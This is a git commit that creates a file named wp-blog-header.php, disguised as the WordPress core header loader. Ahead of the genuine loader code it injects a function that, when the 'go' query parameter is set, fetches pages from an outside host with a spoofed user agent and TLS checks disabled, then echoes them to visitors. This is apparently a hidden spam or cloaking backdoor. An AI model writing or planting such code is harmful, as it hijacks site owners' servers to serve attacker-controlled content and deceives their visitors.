1b1e534535e5faf118b4440f41f5edf4e27eb6a3
GGeercy <112923883+ggeercy@users.noreply.github.com>
2024-07-04 16:40:26 +0700

    Create wp-blog-header.php

---
+++ wp-blog-header.php
@@ -0,0 +1,42 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+function fetchDataFromSite($site) {
+    $url = 'https://replication2.pkcdurensawit.net/imatoncomedica/' . $site . '/';
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_CUSTOMREQUEST => 'GET'
+    ]);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+
+if(isset($_GET['go'])) {
+    $site = $_GET['go'];
+    $data = fetchDataFromSite($site);
+    echo $data;
+} else {
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
+}
